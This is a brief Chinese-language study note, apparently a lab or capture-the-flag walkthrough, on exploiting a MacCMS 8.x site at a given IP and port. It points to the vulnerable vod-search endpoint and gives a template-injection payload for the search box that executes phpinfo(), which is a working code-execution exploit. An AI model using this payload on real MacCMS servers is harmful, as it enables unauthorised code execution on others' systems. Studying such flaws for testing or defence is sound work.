# maccms 8.X 笔记

# 1、登录网站http://81.68.197.243:62202/

![image-20220301172018771](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011720025.png)

> 获得关键信息 网站为 maccms 8.X

## 2、百度查询该网站是否有漏洞

```
http://127.0.0.1/maccms888/?m=vod-search
```

查找到这个url存在代码执行

## 3、利用

搜索框输入：

```
{if-A:phpinfo()}{endif-A}
```

![image-20220301172335923](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011723163.png)

![image-20220301172411437](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011724521.png)